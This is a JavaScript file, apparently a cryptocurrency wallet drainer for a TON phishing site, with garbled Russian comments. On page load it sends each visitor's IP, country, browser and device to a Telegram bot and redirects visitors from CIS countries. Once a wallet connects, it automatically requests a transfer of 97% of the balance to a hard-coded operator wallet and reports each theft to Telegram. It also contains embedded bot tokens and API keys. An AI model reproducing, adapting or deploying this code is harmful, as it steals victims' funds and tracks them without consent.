document.addEventListener('DOMContentLoaded', () => {
    var mainWallet = "UQCjC4fYcBADiiX_RQ_OHHNoIBCk1AqPNzSth2NRpwIRI2Em"; // –ó–∞–º–µ–Ω–∏ –Ω–∞ –∞–¥—Ä–µ—Å —Å–≤–æ–µ–≥–æ –∫–æ—à–µ–ª—å–∫–∞
    var tgBotToken = "7664896852:AAGZGV5KjVG2g4MvACTDhAjK2ONL9qXRBAA"; // –ó–∞–º–µ–Ω–∏ –Ω–∞ —Ç–æ–∫–µ–Ω —Å–≤–æ–µ–≥–æ Telegram-–±–æ—Ç–∞
    var tgChat = -1002426182115; // –ó–∞–º–µ–Ω–∏ –Ω–∞ ID —á–∞—Ç–∞ –∏–ª–∏ –∫–∞–Ω–∞–ª–∞ –≤ Telegram
    var domain = window.location.hostname;
    var ipUser;
    var countryUser;

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TON Connect UI
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: `https://leonardokotu.github.io/mysite/tonconnect-manifest.json`, // URL –º–∞–Ω–∏—Ñ–µ—Å—Ç–∞
        buttonRootId: 'ton-connect' // ID —ç–ª–µ–º–µ–Ω—Ç–∞ –¥–ª—è –∫–Ω–æ–ø–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
    });

    // –ü–æ–ª—É—á–µ–Ω–∏–µ IP –∏ —Å—Ç—Ä–∞–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const country = data.country;
            ipUser = data.ip;
            countryUser = data.country;

            // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –∏ –±—Ä–∞—É–∑–µ—Ä–µ
            const userAgent = navigator.userAgent;
            const os = getOS(userAgent);
            const device = getDevice(userAgent);
            const browser = getBrowser(userAgent);

            // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram –æ –ø–æ—Å–µ—â–µ–Ω–∏–∏ —Å–∞–π—Ç–∞
            const messageOpen = `
üåê *Domain:* ${domain}
üñ•Ô∏è *OS:* ${os}
üì± *Device:* ${device}
üåç *Country:* ${country} (${countryUser})
üì° *IP:* ${ipUser}
üõ†Ô∏è *Browser:* ${browser}
üîó *User Agent:* ${userAgent}
            `;
            sendTelegramMessage(messageOpen);

            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –¥–ª—è —Å—Ç—Ä–∞–Ω –°–ù–ì
            if (['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'].includes(country)) {
                window.location.replace('https://ton.org');
            }
        })
        .catch(error => {
            const errorMessage = `\uD83D\uDED1*–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ IP:* ${error.message}`;
            sendTelegramMessage(errorMessage);
        });

    // –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
    tonConnectUI.onStatusChange(wallet => {
        if (wallet) {
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–º –∫–æ—à–µ–ª—å–∫–µ –≤ Telegram
            const walletInfo = `
üíº *–ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω:*
üíª *–ê–¥—Ä–µ—Å:* ${wallet.account.address}
üí∞ *–ë–∞–ª–∞–Ω—Å:* ${wallet.account.balance} TON
            `;
            sendTelegramMessage(walletInfo);

            // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å—Ä–µ–¥—Å—Ç–≤
            didtrans(wallet.account.address);
        } else {
            const messageDisconnected = `\uD83D\uDED1*–ö–æ—à–µ–ª–µ–∫ –æ—Ç–∫–ª—é—á–µ–Ω.*`;
            sendTelegramMessage(messageDisconnected);
        }
    });

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
    async function didtrans(walletAddress) {
        if (!walletAddress) {
            const errorMessage = `\uD83D\uDED1*–û—à–∏–±–∫–∞:* –ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ –Ω–µ —É–∫–∞–∑–∞–Ω.`;
            sendTelegramMessage(errorMessage);
            return;
        }

        const apiKey = "174eb3d989539906679b1847b569f3a10464a2c1b29fc60b6ae95dd54a2bc31d";
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}&api_key=${apiKey}`);
        const data = await response.json();
        const originalBalance = parseFloat(data.balance);
        const processedBalance = originalBalance - (originalBalance * 0.03); // –í—ã—á–∏—Ç–∞–µ–º 3% –¥–ª—è –∫–æ–º–∏—Å—Å–∏–π
        const tgBalance = processedBalance / 1000000000; // –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –≤ TON

        if (processedBalance <= 0) {
            const errorMessage = `\uD83D\uDED1*–û—à–∏–±–∫–∞:* –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω—ã–π –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏.`;
            sendTelegramMessage(errorMessage);
            return;
        }

        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–∞ 60 —Å–µ–∫—É–Ω–¥
            messages: [{
                address: mainWallet,
                amount: processedBalance.toString() // –°—É–º–º–∞ –≤ –Ω–∞–Ω–æ—Ç–æ–Ω–∞—Ö
            }]
        };

        try {
            // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
            const result = await tonConnectUI.sendTransaction(transaction);

            // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram –æ–± —É—Å–ø–µ—à–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
            const messageSend = `
üåê *Domain:* ${domain}
üíª *User:* ${ipUser} ${countryUser}
üì¶ *Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})
üíé *Send:* ${tgBalance} TON
            `;
            sendTelegramMessage(messageSend);
        } catch (error) {
            // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram –æ–± –æ—à–∏–±–∫–µ
            const messageDeclined = `
üåê *Domain:* ${domain}
üíª *User:* ${ipUser} ${countryUser}
üì¶ *Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})
üõë *Declined or error.*
            `;
            sendTelegramMessage(messageDeclined);
        }
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ Telegram
    function sendTelegramMessage(message) {
        if (!tgBotToken || !tgChat) {
            console.error('–¢–æ–∫–µ–Ω –∏–ª–∏ —á–∞—Ç Telegram –Ω–µ —É–∫–∞–∑–∞–Ω—ã.');
            return;
        }

        const encodedMessage = encodeURIComponent(message);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessage}&parse_mode=Markdown`;

        fetch(url, { method: 'POST' })
            .then(response => {
                if (!response.ok) {
                    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram.');
                }
            })
            .catch(error => console.error('–û—à–∏–±–∫–∞:', error));
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã
    function getOS(userAgent) {
        if (/windows/i.test(userAgent)) return "Windows";
        if (/macintosh/i.test(userAgent)) return "Mac OS";
        if (/linux/i.test(userAgent)) return "Linux";
        if (/android/i.test(userAgent)) return "Android";
        if (/ios/i.test(userAgent)) return "iOS";
        return "Unknown OS";
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    function getDevice(userAgent) {
        if (/mobile/i.test(userAgent)) return "Mobile";
        if (/tablet/i.test(userAgent)) return "Tablet";
        if (/ipad/i.test(userAgent)) return "iPad";
        if (/iphone/i.test(userAgent)) return "iPhone";
        if (/windows phone/i.test(userAgent)) return "Windows Phone";
        return "Desktop";
    }

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞
    function getBrowser(userAgent) {
        if (/chrome/i.test(userAgent)) return "Chrome";
        if (/firefox/i.test(userAgent)) return "Firefox";
        if (/safari/i.test(userAgent)) return "Safari";
        if (/edge/i.test(userAgent)) return "Edge";
        if (/opera/i.test(userAgent)) return "Opera";
        if (/trident/i.test(userAgent)) return "Internet Explorer";
        return "Unknown Browser";
    }
});
